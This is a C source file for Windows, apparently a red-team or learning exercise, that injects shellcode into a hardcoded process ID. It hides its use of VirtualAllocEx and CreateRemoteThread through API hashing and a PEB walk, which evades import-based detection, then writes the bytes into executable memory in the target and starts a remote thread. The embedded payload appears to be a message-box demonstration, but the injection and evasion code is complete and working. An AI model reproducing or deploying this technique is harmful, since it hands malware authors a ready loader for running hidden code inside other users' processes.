#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
using VAX = LPVOID(NTAPI*)(
	          HANDLE hProcess,
	           LPVOID lpAddress,
	           SIZE_T dwSize,
	           DWORD  flAllocationType,
	           DWORD  flProtect
	);
using WPM = BOOL(NTAPI*)(
	  HANDLE  hProcess,
	  LPVOID  lpBaseAddress,
	  LPCVOID lpBuffer,
	  SIZE_T  nSize,
	  SIZE_T* lpNumberOfBytesWritten
	);
using CRT = HANDLE(NTAPI*)(
	  HANDLE                 hProcess,
	  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
	  SIZE_T                 dwStackSize,
	  LPTHREAD_START_ROUTINE lpStartAddress,
	  LPVOID                 lpParameter,
	  DWORD                  dwCreationFlags,
	 LPDWORD                lpThreadId
	);


PDWORD getFunctionAddressByHash(DWORD hash);
HMODULE find_dll_base(const char* dll_name);
DWORD getHashFromString(char* string);
HRESULT UnicodeToAnsi(LPCOLESTR pszW, LPSTR* ppszA);


int main(int argc, char* argv[])
{
	unsigned char shellcode[] = {
		0xFC, 0x48, 0x81, 0xE4, 0xF0, 0xFF, 0xFF, 0xFF, 0xE8, 0xD0, 0x00, 0x00,
		0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65,
		0x48, 0x8B, 0x52, 0x60, 0x3E, 0x48, 0x8B, 0x52, 0x18, 0x3E, 0x48, 0x8B,
		0x52, 0x20, 0x3E, 0x48, 0x8B, 0x72, 0x50, 0x3E, 0x48, 0x0F, 0xB7, 0x4A,
		0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02,
		0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52,
		0x41, 0x51, 0x3E, 0x48, 0x8B, 0x52, 0x20, 0x3E, 0x8B, 0x42, 0x3C, 0x48,
		0x01, 0xD0, 0x3E, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0,
		0x74, 0x6F, 0x48, 0x01, 0xD0, 0x50, 0x3E, 0x8B, 0x48, 0x18, 0x3E, 0x44,
		0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x5C, 0x48, 0xFF, 0xC9, 0x3E,
		0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31,
		0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75,
		0xF1, 0x3E, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD6,
		0x58, 0x3E, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x3E, 0x41,
		0x8B, 0x0C, 0x48, 0x3E, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x3E,
		0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E,
		0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20,
		0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x3E, 0x48, 0x8B, 0x12,
		0xE9, 0x49, 0xFF, 0xFF, 0xFF, 0x5D, 0x49, 0xC7, 0xC1, 0x40, 0x00, 0x00,
		0x00, 0x3E, 0x48, 0x8D, 0x95, 0x1A, 0x01, 0x00, 0x00, 0x3E, 0x4C, 0x8D,
		0x85, 0x2F, 0x01, 0x00, 0x00, 0x48, 0x31, 0xC9, 0x41, 0xBA, 0x45, 0x83,
		0x56, 0x07, 0xFF, 0xD5, 0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6,
		0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C,
		0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A,
		0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x48, 0x65, 0x6C, 0x6C, 0x6F,
		0x20, 0x66, 0x72, 0x6F, 0x6D, 0x20, 0x70, 0x65, 0x69, 0x6E, 0x6A, 0x68,
		0x61, 0x73, 0x68, 0x00, 0x73, 0x68, 0x65, 0x6C, 0x6C, 0x63, 0x6F, 0x64,
		0x65, 0x00
	};

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;
	DWORD processid = 12628;
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processid);
	PDWORD functionAddresSSs = getFunctionAddressByHash(0x006c11198);
	VAX pvax = (VAX)functionAddresSSs;
	remoteBuffer = pvax(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	PDWORD functionAddresss = getFunctionAddressByHash(0x00844e304);
	CRT pcrt = (CRT)functionAddresss;
	remoteThread = pcrt(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);
	return 0;
}

PDWORD getFunctionAddressByHash(DWORD hash)
{
	PDWORD functionAddress = (PDWORD)0;
	HMODULE libraryBase = find_dll_base("KERNEL32.DLL");
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
	PIMAGE_NT_HEADERS NTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);
	DWORD_PTR exportDirectoryRVA = NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_EXPORT_DIRECTORY ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);
	PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + ExportDirectory->AddressOfFunctions);
	PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + ExportDirectory->AddressOfNames);
	PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + ExportDirectory->AddressOfNameOrdinals);
	for (DWORD i = 0; i < ExportDirectory->NumberOfFunctions; i++)
	{
		DWORD functionNameRVA = addressOfNamesRVA[i];
		DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
		char* functionName = (char*)functionNameVA;
		DWORD_PTR functionAddressRVA = 0;
		DWORD functionNameHash = getHashFromString(functionName);
		if (functionNameHash == hash)
		{
			functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
			functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);
			printf("%s : 0x%x : %p\n", functionName, functionNameHash, functionAddress);
			return functionAddress;
		}
	}
}
HMODULE find_dll_base(const char* dll_name) {

	PTEB teb = (PTEB)__readgsqword(offsetof(NT_TIB, Self));
	PPEB_LDR_DATA loader = teb->ProcessEnvironmentBlock->Ldr;

	PLIST_ENTRY head = &loader->InMemoryOrderModuleList;
	PLIST_ENTRY curr = head->Flink;


	do {
		PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		char* dllName;

		UnicodeToAnsi(dllEntry->FullDllName.Buffer, &dllName);
		char* result = strstr(dllName, dll_name);

		if (result != NULL) {
			return (HMODULE)dllEntry->DllBase;
		}
		curr = curr->Flink;
	} while (curr != head);

	return NULL;
}
HRESULT UnicodeToAnsi(LPCOLESTR pszW, LPSTR* ppszA) {
	ULONG cbAnsi, cCharacters;
	DWORD dwError;
	if (pszW == NULL)
	{
		*ppszA = NULL;
		return NOERROR;
	}
	cCharacters = wcslen(pszW) + 1;
	cbAnsi = cCharacters * 2;

	*ppszA = (LPSTR)CoTaskMemAlloc(cbAnsi);
	if (*ppszA == NULL)
		return E_OUTOFMEMORY;

	if (WideCharToMultiByte(CP_ACP, 0, pszW, cCharacters, *ppszA, cbAnsi, NULL, NULL) == 0)
	{
		dwError = GetLastError();
		CoTaskMemFree(*ppszA);
		*ppszA = NULL;
		return HRESULT_FROM_WIN32(dwError);
	}
	return NOERROR;
}
DWORD getHashFromString(char* string)
{
	size_t stringLength = strnlen_s(string, 50);
	DWORD hash = 0x35;

	for (size_t i = 0; i < stringLength; i++)
	{
		hash += (hash * 0xab10f29f + string[i]) & 0xffffff;
	}

	return hash;
}